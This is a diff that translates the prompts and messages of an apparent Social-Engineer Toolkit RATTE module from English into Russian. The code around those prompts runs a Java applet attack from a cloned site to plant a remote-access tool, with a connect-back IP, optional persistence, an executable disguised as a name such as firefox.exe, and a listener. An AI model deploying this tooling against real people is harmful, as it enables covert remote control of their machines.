@@ -68,7 +68,7 @@ def start_web_server_tw(directory, port):
 
     # handle keyboard interrupts
     except KeyboardInterrupt:
-        core.print_info("Exiting the SET web server...")
+        core.print_info("Выход из веб-сервера SET...")
         httpd.socket.close()
 
         # handle the rest
@@ -184,19 +184,19 @@ def main():
                 valid_site = True
             else:
                 if site_input_counter == 2:
-                    core.print_error("\nMaybe you have the address written down wrong?" + core.bcolors.ENDC)
+                    core.print_error("\nМожет быть, вы неправильно записали адрес?" + core.bcolors.ENDC)
                     sleep(4)
                     return
                 else:
-                    core.print_warning("I can't determine the fqdn or IP of the site. Try again?")
+                    core.print_warning("Я не могу определить fqdn или IP сайта. Попробуй снова?")
                     site_input_counter += 1
         else:
             if site_input_counter == 2:
-                core.print_error("\nMaybe you have the address written down wrong?")
+                core.print_error("\nМожет быть, вы неправильно записали адрес?")
                 sleep(4)
                 return
             else:
-                core.print_warning("I couldn't determine whether this is an http or https site. Try again?")
+                core.print_warning("Я не мог определить, является ли это http или https сайтом. Попробуй снова?")
                 site_input_counter += 1
                 # core.DebugInfo("site.scheme is: %s " % site.scheme)
                 # core.DebugInfo("site.netloc is: %s " % site.netloc)
@@ -206,11 +206,11 @@ def main():
                 # core.DebugInfo("site.fragment is: %s " % site.fragment)
 
     while not valid_ip and input_counter < 3:
-        ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
+        ipaddr = input(core.setprompt(["9", "2"], "Введите IP-адрес для подключения"))
         valid_ip = core.validate_ip(ipaddr)
         if not valid_ip:
             if input_counter == 2:
-                core.print_error("\nMaybe you have the address written down wrong?")
+                core.print_error("\nМожет быть, вы неправильно записали адрес?")
                 sleep(4)
                 return
             else:
@@ -218,31 +218,31 @@ def main():
 
     # javaport must be 80, cause applet uses in web injection port 80 to download payload!
     try:
-        javaport = int(input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
+        javaport = int(input(core.setprompt(["9", "2"], "Апплет порта Java должен слушать [80]")))
         while javaport == 0 or javaport > 65535:
             if javaport == 0:
                 core.print_warning(text.PORT_NOT_ZERO)
             if javaport > 65535:
                 core.print_warning(text.PORT_TOO_HIGH)
-            javaport = int(input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
+            javaport = int(input(core.setprompt(["9", "2"], "Апплет порта Java должен слушать [80]")))
     except ValueError:
         # core.print_info("Port set to default of 80")
         javaport = 80
 
     try:
-        ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
+        ratteport = int(input(core.setprompt(["9", "2"], "Сервер RATTE порта должен слушать [8080]")))
         while ratteport == javaport or ratteport == 0 or ratteport > 65535:
             if ratteport == javaport:
-                core.print_warning("Port must not be equal to javaport!")
+                core.print_warning("Порт не должен быть равен javaport!")
             if ratteport == 0:
                 core.print_warning(text.PORT_NOT_ZERO)
             if ratteport > 65535:
                 core.print_warning(text.PORT_TOO_HIGH)
-            ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
+            ratteport = int(input(core.setprompt(["9", "2"], "Сервер RATTE порта должен слушать [8080]")))
     except ValueError:
         ratteport = 8080
 
-    persistent = core.yesno_prompt(["9", "2"], "Should RATTE be persistentententent [no|yes]?")
+    persistent = core.yesno_prompt(["9", "2"], "Должен ли RATTE быть постоянным [no|yes]?")
 
     # j0fer 06-27-2012 #        while valid_persistence != True:
     # j0fer 06-27-2012 #                persistent=input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
@@ -256,8 +256,7 @@ def main():
     # j0fer 06-27-2012 #                else:
     # j0fer 06-27-2012 #                       core.print_warning(text.YES_NO_RESPONSES)
 
-    customexe = input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))
-
+    customexe = input(core.setprompt(["9", "2"], "Используйте конкретное имя файла (например, firefox.exe) [filename.exe или пусто]? "))
     #######################################
     # prepare RATTE
     #######################################
@@ -268,7 +267,7 @@ def main():
     # Java Applet Attack to deploy RATTE
     #######################################
 
-    core.print_info("Starting java applet attack...")
+    core.print_info("Запуск атаки Java-апплета..")
     java_applet_attack_tw(website, javaport, "reports/", ipaddr)
 
     with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
@@ -280,7 +279,7 @@ def main():
     # start ratteserver
     #######################
 
-    core.print_info("Starting ratteserver...")
+    core.print_info("Стартовый ратсервер...")
     ratte_listener_start(ratteport)
 
     ######################
